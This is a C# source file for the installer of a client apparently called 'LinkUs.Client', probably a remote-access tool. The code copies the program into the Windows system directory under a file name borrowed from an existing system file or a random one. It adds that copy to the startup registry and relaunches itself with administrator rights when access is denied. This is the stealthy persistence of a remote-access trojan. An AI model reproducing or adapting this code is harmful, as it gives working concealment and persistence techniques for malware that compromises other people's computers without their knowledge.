using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace LinkUs.Client.Install
{
    public class Installer
    {
        private readonly IEnvironment _environment;
        private readonly IFileService _fileService;
        private readonly IRegistry _registry;
        private readonly IProcessManager _processManager;

        // ----- Constructor
        public Installer(
            IEnvironment environment,
            IFileService fileService,
            IRegistry registry,
            IProcessManager processManager)
        {
            _environment = environment;
            _fileService = fileService;
            _registry = registry;
            _processManager = processManager;
        }

        // ----- Public methods
        public InstallationStatus Install()
        {
            try {
                var currentInstalledApplicationPath = _registry.GetFileLocation();
                if (string.IsNullOrEmpty(currentInstalledApplicationPath)) {
                    ProcessInstall();
                }
                else if (string.Equals(currentInstalledApplicationPath, _environment.ApplicationPath, StringComparison.InvariantCultureIgnoreCase)) {
                    CheckInstall();
                }
                else {
                    var installedAssemblyInfo = AssemblyName.GetAssemblyName(currentInstalledApplicationPath);
                    if (installedAssemblyInfo.Version >= Assembly.GetEntryAssembly().GetName().Version) {
                        var fileName = Path.GetFileName(currentInstalledApplicationPath);
                        var processes = Process.GetProcessesByName(fileName);
                        if (processes.Length == 0) {
                            Process.Start(new ProcessStartInfo(currentInstalledApplicationPath));
                            // todo: missing case where the existing client is not well installed.
                            // when restarted, it will try to checkinstall() and open uac! bad.
                        }
                        return InstallationStatus.Failed;
                    }
                    else {
                        ProcessInstall();
                    }
                }
                return InstallationStatus.Success;
            }
            catch (UnauthorizedAccessException) {
                var processStarted = _processManager.StartProcessWithElevatedPrivileges(_environment.ApplicationPath);
                if (processStarted) {
                    // We succeded to start a new process in admin mode
                    // we can abort the installation.
                    return InstallationStatus.Aborted;
                }
                else {
                    // We failed to start the process in admin mode
                    return InstallationStatus.Failed;
                }
            }
        }
        public void Uninstall()
        {
            _registry.RemoveFileFromStartupRegistry(_environment.ApplicationPath);
            _registry.ClearFileLocation();
        }

        // ----- Internal logic
        private void ProcessInstall()
        {
            var fileName = _fileService.GetFileNameCopiedFromExisting(GetInstallationDirectory()) ?? _fileService.GetRandomFileName();
            var targetFilePath = Path.Combine(GetInstallationDirectory(), fileName);

            _fileService.Copy(_environment.ApplicationPath, targetFilePath);
            _registry.AddFileToStartupRegistry(targetFilePath);
            _registry.SetFileLocation(targetFilePath);
        }
        private void CheckInstall()
        {
            if (_registry.IsRegisteredAtStartup(_environment.ApplicationPath) == false) {
                _registry.AddFileToStartupRegistry(_environment.ApplicationPath);
            }
            if (_registry.GetFileLocation() != _environment.ApplicationPath) {
                _registry.SetFileLocation(_environment.ApplicationPath);
            }
        }
        private string GetInstallationDirectory()
        {
            // For 64bit operating system, when trying to copy file to
            // system32, it copies file in C:\WINDOWS\SysWOW64 because of
            // file redirector. (system32 directory contains only 64bit programs.)
            if (_environment.Is64Bit) {
                return Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
            }
            else {
                return Environment.GetFolderPath(Environment.SpecialFolder.System);
            }
        }
    }

    public enum InstallationStatus
    {
        Failed,
        Success,
        Aborted
    }
}